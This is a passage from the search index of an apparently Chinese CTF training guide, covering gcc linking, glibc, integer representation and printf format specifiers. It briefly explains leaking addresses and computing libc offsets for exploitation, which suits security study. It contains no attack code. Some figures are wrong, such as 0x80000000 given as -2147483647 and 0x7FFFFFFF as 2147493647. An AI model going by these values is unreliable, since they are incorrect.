/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/crtend.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crtn.o\n</code></pre> <p>\u4e09\u6761\u6307\u4ee4\u5206\u522b\u662f <code>cc1</code>\u3001<code>as</code> \u548c <code>collect2</code>\uff0ccc1 \u662f gcc \u7684\u7f16\u8bd1\u5668\uff0c\u5c06 <code>.c</code> \u6587\u4ef6\u7f16\u8bd1\u4e3a <code>.s</code> \u6587\u4ef6\uff0cas \u662f\u6c47\u7f16\u5668\u547d\u4ee4\uff0c\u5c06 <code>.s</code> \u6587\u4ef6\u6c47\u7f16\u6210 <code>.o</code> \u6587\u4ef6\uff0ccollect2 \u662f\u94fe\u63a5\u5668\u547d\u4ee4\uff0c\u5b83\u662f\u5bf9\u547d\u4ee4 ld \u7684\u5c01\u88c5\u3002\u9759\u6001\u94fe\u63a5\u65f6\uff0cgcc \u5c06 C \u8bed\u8a00\u8fd0\u884c\u65f6\u5e93\u7684 5 \u4e2a\u91cd\u8981\u76ee\u6807\u6587\u4ef6 <code>crt1.o</code>\u3001<code>crti.o</code>\u3001<code>crtbeginT.o</code>\u3001<code>crtend.o</code>\u3001<code>crtn.o</code> \u548c <code>-lgcc</code>\u3001<code>-lgcc_eh</code>\u3001<code>-lc</code> \u8868\u793a\u7684 3 \u4e2a\u9759\u6001\u5e93\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002</p> <p>\u66f4\u591a\u7684\u5185\u5bb9\u6211\u4eec\u4f1a\u5728 1.5.3 \u4e2d\u4e13\u95e8\u5bf9 ELF \u6587\u4ef6\u8fdb\u884c\u8bb2\u89e3\u3002</p>"},{"location":"Training/Material/Reverse/#c_1","title":"C \u8bed\u8a00\u6807\u51c6\u5e93","text":"<p>C \u8fd0\u884c\u5e93\uff08CRT\uff09\u662f\u4e00\u5957\u5e9e\u5927\u7684\u4ee3\u7801\u5e93\uff0c\u4ee5\u652f\u6491\u7a0b\u5e8f\u80fd\u591f\u6b63\u5e38\u5730\u8fd0\u884c\u3002\u5176\u4e2d C \u8bed\u8a00\u6807\u51c6\u5e93\u5360\u636e\u4e86\u6700\u4e3b\u8981\u5730\u4f4d\u3002</p> <p>\u5e38\u7528\u7684\u6807\u51c6\u5e93\u6587\u4ef6\u5934\uff1a</p> <ul> <li>\u6807\u51c6\u8f93\u5165\u8f93\u51fa\uff08stdio.h\uff09</li> <li>\u5b57\u7b26\u64cd\u4f5c\uff08ctype.h\uff09</li> <li>\u5b57\u7b26\u4e32\u64cd\u4f5c\uff08string.h\uff09</li> <li>\u6570\u5b66\u51fd\u6570\uff08math.h\uff09</li> <li>\u5b9e\u7528\u7a0b\u5e8f\u5e93\uff08stdlib.h\uff09</li> <li>\u65f6\u95f4\uff0f\u65e5\u671f\uff08time.h\uff09</li> <li>\u65ad\u8a00\uff08assert.h\uff09</li> <li>\u5404\u79cd\u7c7b\u578b\u4e0a\u7684\u5e38\u6570\uff08limits.h &amp; float.h\uff09</li> <li>\u53d8\u957f\u53c2\u6570\uff08stdarg.h\uff09</li> <li>\u975e\u5c40\u90e8\u8df3\u8f6c\uff08setjmp.h\uff09</li> </ul> <p>glibc \u5373 GNU C Library\uff0c\u662f\u4e3a GNU \u64cd\u4f5c\u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u4e2a C \u6807\u51c6\u5e93\u3002glibc \u4e3b\u8981\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u90e8\u5206\u662f\u5934\u6587\u4ef6\uff0c\u4f4d\u4e8e <code>/usr/include</code>\uff1b\u53e6\u4e00\u90e8\u5206\u662f\u5e93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u90e8\u5206\u4e3b\u8981\u662f C \u8bed\u8a00\u6807\u51c6\u5e93\uff0c\u6709\u52a8\u6001\u548c\u9759\u6001\u4e24\u4e2a\u7248\u672c\uff0c\u52a8\u6001\u7248\u672c\u4f4d\u4e8e <code>/lib/libc.so.6</code>\uff0c\u9759\u6001\u7248\u672c\u4f4d\u4e8e <code>/usr/lib/libc.a</code>\u3002</p> <p>\u5728\u6f0f\u6d1e\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u901a\u5e38\u6211\u4eec\u901a\u8fc7\u8ba1\u7b97\u76ee\u6807\u51fd\u6570\u5730\u5740\u76f8\u5bf9\u4e8e\u5df2\u77e5\u51fd\u6570\u5730\u5740\u5728\u540c\u4e00\u4e2a libc \u4e2d\u7684\u504f\u79fb\uff0c\u6765\u83b7\u5f97\u76ee\u6807\u51fd\u6570\u7684\u865a\u62df\u5730\u5740\uff0c\u8fd9\u65f6\u6211\u4eec\u9700\u8981\u8ba9\u672c\u5730\u7684 libc \u7248\u672c\u548c\u8fdc\u7a0b\u7684 libc \u7248\u672c\u76f8\u540c\uff0c\u53ef\u4ee5\u5148\u6cc4\u9732\u51e0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u7136\u540e\u5728 libcdb.com \u4e2d\u8fdb\u884c\u641c\u7d22\u6765\u5f97\u5230\u3002</p>"},{"location":"Training/Material/Reverse/#_7","title":"\u6574\u6570\u8868\u793a","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cC \u8bed\u8a00\u4e2d\u7684\u6570\u5b57\u662f\u6709\u7b26\u53f7\u6570\uff0c\u4e0b\u9762\u6211\u4eec\u58f0\u660e\u4e00\u4e2a\u6709\u7b26\u53f7\u6574\u6570\u548c\u65e0\u7b26\u53f7\u6574\u6570\uff1a</p> <pre><code>int var1 = 0;\nunsigned int var2 = 0;\n</code></pre> <ul> <li>\u6709\u7b26\u53f7\u6574\u6570</li> <li>\u53ef\u4ee5\u8868\u793a\u4e3a\u6b63\u6570\u6216\u8d1f\u6570</li> <li><code>int</code> \u7684\u8303\u56f4\uff1a<code>-2,147,483,648 ~ 2,147,483,647</code></li> <li>\u65e0\u7b26\u53f7\u6574\u6570</li> <li>\u53ea\u80fd\u8868\u793a\u4e3a\u96f6\u6216\u6b63\u6570</li> <li><code>unsigned int</code> \u7684\u8303\u56f4\uff1a<code>0 ~ 4,294,967,295</code></li> </ul> <p><code>signed</code> \u6216\u8005 <code>unsigned</code> \u53d6\u51b3\u4e8e\u6574\u6570\u7c7b\u578b\u662f\u5426\u53ef\u4ee5\u643a\u5e26\u6807\u5fd7 <code>+/-</code>\uff1a</p> <ul> <li>Signed</li> <li>int</li> <li>signed int</li> <li>long</li> <li>Unsigned</li> <li>unit</li> <li>unsigned int</li> <li>unsigned long</li> </ul> <p>\u5728 <code>signed int</code> \u4e2d\uff0c\u4e8c\u8fdb\u5236\u6700\u9ad8\u4f4d\u88ab\u79f0\u4f5c\u7b26\u53f7\u4f4d\uff0c\u7b26\u53f7\u4f4d\u88ab\u8bbe\u7f6e\u4e3a <code>1</code> \u65f6\uff0c\u8868\u793a\u503c\u4e3a\u8d1f\uff0c\u5f53\u8bbe\u7f6e\u4e3a <code>0</code> \u65f6\uff0c\u503c\u4e3a\u975e\u8d1f\uff1a</p> <ul> <li>0x7FFFFFFF = 2147493647</li> <li>01111111111111111111111111111111</li> <li>0x80000000 = -2147483647</li> <li>10000000000000000000000000000000</li> <li>0xFFFFFFFF = -1</li> <li>11111111111111111111111111111111</li> </ul> <p>\u4e8c\u8fdb\u5236\u8865\u7801\u4ee5\u4e00\u79cd\u9002\u5408\u4e8e\u4e8c\u8fdb\u5236\u52a0\u6cd5\u5668\u7684\u65b9\u5f0f\u6765\u8868\u793a\u8d1f\u6570\uff0c\u5f53\u4e00\u4e2a\u4e8c\u8fdb\u5236\u8865\u7801\u5f62\u5f0f\u8868\u793a\u7684\u8d1f\u6570\u548c\u4e0e\u5b83\u7684\u7edd\u5bf9\u503c\u76f8\u7b49\u7684\u6b63\u6570\u76f8\u52a0\u65f6\uff0c\u7ed3\u679c\u4e3a 0\u3002\u9996\u5148\u4ee5\u4e8c\u8fdb\u5236\u65b9\u5f0f\u5199\u51fa\u6b63\u6570\uff0c\u7136\u540e\u5bf9\u6240\u6709\u4f4d\u53d6\u53cd\uff0c\u6700\u540e\u52a0 1 \u5c31\u53ef\u4ee5\u5f97\u5230\u8be5\u6570\u7684\u4e8c\u8fdb\u5236\u8865\u7801\uff1a</p> <pre><code>eg: 0x00123456\n  = 1193046\n  = 00000000000100100011010001010110\n ~= 11111111111011011100101110101001\n += 11111111111011011100101110101010\n  = -1193046 (0xFFEDCBAA)\n</code></pre> <p>\u7f16\u8bd1\u5668\u9700\u8981\u6839\u636e\u53d8\u91cf\u7c7b\u578b\u4fe1\u606f\u7f16\u8bd1\u6210\u76f8\u5e94\u7684\u6307\u4ee4\uff1a</p> <ul> <li>\u6709\u7b26\u53f7\u6307\u4ee4</li> <li>IDIV\uff1a\u5e26\u7b26\u53f7\u9664\u6cd5\u6307\u4ee4</li> <li>IMUL\uff1a\u5e26\u7b26\u53f7\u4e58\u6cd5\u6307\u4ee4</li> <li>SAL\uff1a\u7b97\u672f\u5de6\u79fb\u6307\u4ee4\uff08\u4fdd\u7559\u7b26\u53f7\uff09</li> <li>SAR\uff1a\u53f3\u79fb\u53f3\u79fb\u6307\u4ee4\uff08\u4fdd\u7559\u7b26\u53f7\uff09</li> <li>MOVSX\uff1a\u5e26\u7b26\u53f7\u6269\u5c55\u4f20\u9001\u6307\u4ee4</li> <li>JL\uff1a\u5f53\u5c0f\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>JLE\uff1a\u5f53\u5c0f\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>JG\uff1a\u5f53\u5927\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>JGE\uff1a\u5f53\u5927\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>\u65e0\u7b26\u53f7\u6307\u4ee4</li> <li>DIV\uff1a\u9664\u6cd5\u6307\u4ee4</li> <li>MUL\uff1a\u4e58\u6cd5\u6307\u4ee4</li> <li>SHL\uff1a\u903b\u8f91\u5de6\u79fb\u6307\u4ee4</li> <li>SHR\uff1a\u903b\u8f91\u53f3\u79fb\u6307\u4ee4</li> <li>MOVZX\uff1a\u65e0\u7b26\u53f7\u6269\u5c55\u4f20\u9001\u6307\u4ee4</li> <li>JB\uff1a\u5f53\u5c0f\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>JBE\uff1a\u5f53\u5c0f\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>JA\uff1a\u5f53\u5927\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> <li>JAE\uff1a\u5f53\u5927\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4</li> </ul> <p>32 \u4f4d\u673a\u5668\u4e0a\u7684\u6574\u578b\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\uff1a</p> C \u6570\u636e\u7c7b\u578b \u6700\u5c0f\u503c \u6700\u5927\u503c \u6700\u5c0f\u5927\u5c0f char -128 127 8 bits short -32 768 32 767 16 bits int -2 147 483 648 2 147 483 647 16 bits long -2 147 483 648 2 147 483 647 32 bits long long -9 223 372 036 854 775 808 9 223 372 036 854 775 807 64 bits <p>\u56fa\u5b9a\u5927\u5c0f\u7684\u6570\u636e\u7c7b\u578b\uff1a</p> <ul> <li> <p><code>int [# of bits]_t</code></p> </li> <li> <p>int8_t, int16_t, int32_t</p> </li> <li> <p><code>uint[# of bits]_t</code></p> </li> <li> <p>uint8_t, uint16_t, uint32_t</p> </li> <li> <p>\u6709\u7b26\u53f7\u6574\u6570</p> </li> <li> <p></p> </li> <li> <p>\u65e0\u7b26\u53f7\u6574\u6570</p> </li> <li> <p></p> </li> </ul> <p>\u66f4\u591a\u4fe1\u606f\u5728 <code>stdint.h</code> \u548c <code>limits.h</code> \u4e2d\uff1a</p> <pre><code>man stdint.h\ncat /usr/include/stdint.h\nman limits.h\ncat /usr/include/limits.h\n</code></pre> <p>\u4e86\u89e3\u6574\u6570\u7684\u7b26\u53f7\u548c\u5927\u5c0f\u662f\u5f88\u6709\u7528\u7684\uff0c\u5728\u540e\u9762\u7684\u76f8\u5173\u7ae0\u8282\u4e2d\u6211\u4eec\u4f1a\u4ecb\u7ecd\u6574\u6570\u6ea2\u51fa\u7684\u5185\u5bb9\u3002</p>"},{"location":"Training/Material/Reverse/#_8","title":"\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570","text":"<p>C \u6807\u51c6\u4e2d\u5b9a\u4e49\u4e86\u4e0b\u9762\u7684\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\uff08\u53c2\u8003 <code>man \uff13 printf</code>\uff09\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint printf(const char *format, ...);\nint fprintf(FILE *stream, const char *format, ...);\nint dprintf(int fd, const char *format, ...);\nint sprintf(char *str, const char *format, ...);\nint snprintf(char *str, size_t size, const char *format, ...);\n\n#include &lt;stdarg.h&gt;\n\nint vprintf(const char *format, va_list ap);\nint vfprintf(FILE *stream, const char *format, va_list ap);\nint vdprintf(int fd, const char *format, va_list ap);\nint vsprintf(char *str, const char *format, va_list ap);\nint vsnprintf(char *str, size_t size, const char *format, va_list ap);\n</code></pre> <ul> <li><code>fprintf()</code> \u6309\u7167\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u5c06\u8f93\u51fa\u5199\u5165\u6d41\u4e2d\u3002\u4e09\u4e2a\u53c2\u6570\u4e3a\u6d41\u3001\u683c\u5f0f\u5b57\u7b26\u4e32\u548c\u53d8\u53c2\u5217\u8868\u3002</li> <li><code>printf()</code> \u7b49\u540c\u4e8e <code>fprintf()</code>\uff0c\u4f46\u662f\u5b83\u5047\u5b9a\u8f93\u51fa\u6d41\u4e3a <code>stdout</code>\u3002</li> <li><code>sprintf()</code> \u7b49\u540c\u4e8e <code>fprintf()</code>\uff0c\u4f46\u662f\u8f93\u51fa\u4e0d\u662f\u5199\u5165\u6d41\u800c\u662f\u5199\u5165\u6570\u7ec4\u3002\u5728\u5199\u5165\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u5fc5\u987b\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002</li> <li><code>snprintf()</code> \u7b49\u540c\u4e8e <code>sprintf()</code>\uff0c\u4f46\u662f\u5b83\u6307\u5b9a\u4e86\u53ef\u5199\u5165\u5b57\u7b26\u7684\u6700\u5927\u503c <code>size</code>\u3002\u5f53 <code>size</code> \u5927\u4e8e\u96f6\u65f6\uff0c\u8f93\u51fa\u5b57\u7b26\u8d85\u8fc7\u7b2c <code>size-1</code> \u7684\u90e8\u5206\u4f1a\u88ab\u820d\u5f03\u800c\u4e0d\u4f1a\u5199\u5165\u6570\u7ec4\u4e2d\uff0c\u5728\u5199\u5165\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u4f1a\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002</li> <li><code>dprintf()</code> \u7b49\u540c\u4e8e <code>fprintf()</code>\uff0c\u4f46\u662f\u5b83\u8f93\u51fa\u4e0d\u662f\u6d41\u800c\u662f\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26 <code>fd</code>\u3002</li> <li><code>vfprintf()</code>\u3001<code>vprintf()</code>\u3001<code>vsprintf()</code>\u3001<code>vsnprintf()</code>\u3001<code>vdprintf()</code> \u5206\u522b\u4e0e\u4e0a\u9762\u7684\u51fd\u6570\u5bf9\u5e94\uff0c\u53ea\u662f\u5b83\u4eec\u5c06\u53d8\u53c2\u5217\u8868\u6362\u6210\u4e86 <code>va_list</code> \u7c7b\u578b\u7684\u53c2\u6570\u3002</li> </ul>"},{"location":"Training/Material/Reverse/#_9","title":"\u683c\u5f0f\u5b57\u7b26\u4e32","text":"<p>\u683c\u5f0f\u5b57\u7b26\u4e32\u662f\u7531\u666e\u901a\u5b57\u7b26\uff08ordinary character\uff09\uff08\u5305\u62ec <code>%</code>\uff09\u548c\u8f6c\u6362\u89c4\u5219\uff08conversion specification\uff09\u6784\u6210\u7684\u5b57\u7b26\u5e8f\u5217\u3002\u666e\u901a\u5b57\u7b26\u88ab\u539f\u5c01\u4e0d\u52a8\u5730\u590d\u5236\u5230\u8f93\u51fa\u6d41\u4e2d\u3002\u8f6c\u6362\u89c4\u5219\u6839\u636e\u4e0e\u5b9e\u53c2\u5bf9\u5e94\u7684\u8f6c\u6362\u6307\u793a\u7b26\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u5199\u5165\u8f93\u51fa\u6d41\u4e2d\u3002</p> <p>\u4e00\u4e2a\u8f6c\u6362\u89c4\u5219\u6709\u53ef\u9009\u90e8\u5206\u548c\u5fc5\u9700\u90e8\u5206\u7ec4\u6210\uff1a</p> <pre><code>%[ \u53c2\u6570 ][ \u6807\u5fd7 ][ \u5bbd\u5ea6 ][ .\u7cbe\u5ea6 ][ \u957f\u5ea6 ] \u8f6c\u6362\u6307\u793a\u7b26\n</code></pre> <ul> <li>\uff08\u5fc5\u9700\uff09\u8f6c\u6362\u6307\u793a\u7b26</li> </ul> \u5b57\u7b26 \u63cf\u8ff0 <code>d</code>, <code>i</code> \u6709\u7b26\u53f7\u5341\u8fdb\u5236\u6570\u503c <code>int</code>\u3002'<code>%d</code>' \u4e0e '<code>%i</code>' \u5bf9\u4e8e\u8f93\u51fa\u662f\u540c\u4e49\uff1b\u4f46\u5bf9\u4e8e <code>scanf()</code> \u8f93\u5165\u4e8c\u8005\u4e0d\u540c\uff0c\u5176\u4e2d <code>%i</code> \u5728\u8f93\u5165\u503c\u6709\u524d\u7f00 <code>0x</code> \u6216 <code>0</code> \u65f6\uff0c\u5206\u522b\u8868\u793a 16 \u8fdb\u5236\u6216 8 \u8fdb\u5236\u7684\u503c\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a <code>u</code> \u5341\u8fdb\u5236 <code>unsigned int</code>\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a <code>f</code>, <code>F</code> <code>double</code> \u578b\u8f93\u51fa 10 \u8fdb\u5236\u5b9a\u70b9\u8868\u793a\u3002'<code>f</code>' \u4e0e '<code>F</code>' \u5dee\u5f02\u662f\u8868\u793a\u65e0\u7a77\u4e0e NaN \u65f6\uff0c'<code>f</code>' \u8f93\u51fa '<code>inf</code>', '<code>infinity</code>' \u4e0e '<code>nan</code>'\uff1b'<code>F</code>' \u8f93\u51fa '<code>INF</code>', '<code>INFINITY</code>' \u4e0e '<code>NAN</code>'\u3002\u5c0f\u6570\u70b9\u540e\u7684\u6570\u5b57\u4f4d\u6570\u7b49\u4e8e\u7cbe\u5ea6\uff0c\u6700\u540e\u4e00\u4f4d\u6570\u5b57\u56db\u820d\u4e94\u5165\u3002\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6\u3002\u5982\u679c\u7cbe\u5ea6\u4e3a 0 \u4e14\u6ca1\u6709 # \u6807\u8bb0\uff0c\u5219\u4e0d\u51fa\u73b0\u5c0f\u6570\u70b9\u3002\u5c0f\u6570\u70b9\u5de6\u4fa7\u81f3\u5c11\u4e00\u4f4d\u6570\u5b57 <code>e</code>, <code>E</code> <code>double</code> \u503c\uff0c\u8f93\u51fa\u5f62\u5f0f\u4e3a 10 \u8fdb\u5236\u7684([<code>-</code>]d.ddd <code>e</code>[<code>+</code>/<code>-</code>]ddd). <code>E</code> \u7248\u672c\u4f7f\u7528\u7684\u6307\u6570\u7b26\u53f7\u4e3a <code>E</code>\uff08\u800c\u4e0d\u662f<code>e</code>\uff09\u3002\u6307\u6570\u90e8\u5206\u81f3\u5c11\u5305\u542b 2 \u4f4d\u6570\u5b57\uff0c\u5982\u679c\u503c\u4e3a 0\uff0c\u5219\u6307\u6570\u90e8\u5206\u4e3a 00\u3002Windows \u7cfb\u7edf\uff0c\u6307\u6570\u90e8\u5206\u81f3\u5c11\u4e3a 3 \u4f4d\u6570\u5b57\uff0c\u4f8b\u5982 1.5e002\uff0c\u4e5f\u53ef\u7528 Microsoft \u7248\u7684\u8fd0\u884c\u65f6\u51fd\u6570 <code>_set_output_format</code> \u4fee\u6539\u3002\u5c0f\u6570\u70b9\u524d\u5b58\u5728 1 \u4f4d\u6570\u5b57\u3002\u5c0f\u6570\u70b9\u540e\u7684\u6570\u5b57\u4f4d\u6570\u7b49\u4e8e\u7cbe\u5ea6\u3002\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6\u3002\u5982\u679c\u7cbe\u5ea6\u4e3a 0 \u4e14\u6ca1\u6709 # \u6807\u8bb0\uff0c\u5219\u4e0d\u51fa\u73b0\u5c0f\u6570\u70b9 <code>g</code>, <code>G</code> <code>double</code> \u578b\u6570\u503c\uff0c\u7cbe\u5ea6\u5b9a\u4e49\u4e3a\u5168\u90e8\u6709\u6548\u6570\u5b57\u4f4d\u6570\u3002\u5f53\u6307\u6570\u90e8\u5206\u5728\u95ed\u533a\u95f4 [-4,\u7cbe\u5ea6] \u5185\uff0c\u8f93\u51fa\u4e3a\u5b9a\u70b9\u5f62\u5f0f\uff1b\u5426\u5219\u8f93\u51fa\u4e3a\u6307\u6570\u6d6e\u70b9\u5f62\u5f0f\u3002'<code>g</code>' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c'<code>G</code>' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5c0f\u6570\u70b9\u53f3\u4fa7\u7684\u5c3e\u6570 0 \u4e0d\u88ab\u663e\u793a\uff1b\u663e\u793a\u5c0f\u6570\u70b9\u4ec5\u5f53\u8f93\u51fa\u7684\u5c0f\u6570\u90e8\u5206\u4e0d\u4e3a 0 <code>x</code>, <code>X</code> 16 \u8fdb\u5236 <code>unsigned int</code>\u3002'<code>x</code>' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1b'<code>X</code>' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a <code>o</code> 8 \u8fdb\u5236 <code>unsigned int</code>\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a <code>s</code> \u5982\u679c\u6ca1\u6709\u7528 <code>l</code> \u6807\u5fd7\uff0c\u8f93\u51fa <code>null</code> \u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86 <code>l</code> \u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411 <code>wchar_t</code> \u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528 <code>wcrtomb</code> \u51fd\u6570 <code>c</code> \u5982\u679c\u6ca1\u6709\u7528 <code>l</code> \u6807\u5fd7\uff0c\u628a <code>int</code> \u53c2\u6570\u8f6c\u4e3a <code>unsigned char</code> \u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86 <code>l</code> \u6807\u5fd7\uff0c\u628a <code>wint_t</code> \u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684 <code>wchart_t</code> \u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3a <code>null</code> \u5bbd\u5b57\u7b26 <code>p</code> <code>void *</code> \u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002<code>printf(\"%p\", a)</code> \u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cf <code>a</code> \u7684\u503c\uff0c<code>printf(\"%p\", &amp;a)</code> \u6253\u5370\u53d8\u91cf <code>a</code> \u6240\u5728\u7684\u5730\u5740 <code>a</code>, <code>A</code> <code>double</code> \u578b\u7684 16 \u8fdb\u5236\u8868\u793a\uff0c\"[\u2212]0xh.hhhh p\u00b1d\"\u3002\u5176\u4e2d\u6307\u6570\u90e8\u5206\u4e3a 10 \u8fdb\u5236\u8868\u793a\u7684\u5f62\u5f0f\u3002\u4f8b\u5982\uff1a1025.010 \u8f93\u51fa\u4e3a 0x1.004000p+10\u3002'<code>a</code>' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c'<code>A</code>' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd <code>n</code> \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf <code>%</code> '<code>%</code>' \u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55\u9664\u4e86 <code>\u53c2\u6570</code> \u4ee5\u5916\u7684\u90e8\u5206 <ul> <li>\uff08\u53ef\u9009\uff09\u53c2\u6570</li> </ul> \u5b57\u7b26 \u63cf\u8ff0 <code>n$</code> <code>n</code> \u662f\u7528\u8fd9\u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\u663e\u793a\u7b2c\u51e0\u4e2a\u53c2\u6570\uff1b\u8fd9\u4f7f\u5f97\u53c2\u6570\u53ef\u4ee5\u8f93\u51fa\u591a\u6b21\uff0c\u4f7f\u7528\u591a\u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\uff0c\u4ee5\u4e0d\u540c\u7684\u987a\u5e8f\u8f93\u51fa\u3002\u5982\u679c\u4efb\u610f\u4e00\u4e2a\u5360\u4f4d\u7b26\u4f7f\u7528\u4e86 <code>\u53c2\u6570</code>\uff0c\u5219\u5176\u4ed6\u6240\u6709\u5360\u4f4d\u7b26\u5fc5\u987b\u4e5f\u4f7f\u7528 <code>\u53c2\u6570</code>\u3002\u4f8b\uff1a<code>printf(\"%2$d %2$#x; %1$d %1$#x\",16,17)</code> \u4ea7\u751f \"<code>17 0x11; 16 0x10</code>\" <ul> <li>\uff08\u53ef\u9009\uff09\u6807\u5fd7</li> </ul> \u5b57\u7b26 \u63cf\u8ff0 <code>+</code> \u603b\u662f\u8868\u793a\u6709\u7b26\u53f7\u6570\u503c\u7684 '<code>+</code>' \u6216 '<code>-</code>' \u53f7\uff0c\u7f3a\u7701\u60c5\u51b5\u662f\u5ffd\u7565\u6b63\u6570\u7684\u7b26\u53f7\u3002\u4ec5\u9002\u7528\u4e8e\u6570\u503c\u7c7b\u578b \u7a7a\u683c \u4f7f\u5f97\u6709\u7b26\u53f7\u6570\u7684\u8f93\u51fa\u5982\u679c\u6ca1\u6709\u6b63\u8d1f\u53f7\u6216\u8005\u8f93\u51fa 0 \u4e2a\u5b57\u7b26\uff0c\u5219\u524d\u7f00 1 \u4e2a\u7a7a\u683c\u3002\u5982\u679c\u7a7a\u683c\u4e0e '<code>+</code>' \u540c\u65f6\u51fa\u73b0\uff0c\u5219\u7a7a\u683c\u8bf4\u660e\u7b26\u88ab\u5ffd\u7565 <code>-</code> \u5de6\u5bf9\u9f50\u3002\u7f3a\u7701\u60c5\u51b5\u662f\u53f3\u5bf9\u9f50 <code>#</code> \u5bf9\u4e8e '<code>g</code>' \u4e0e '<code>G</code>'\uff0c\u4e0d\u5220\u9664\u5c3e\u90e8 0 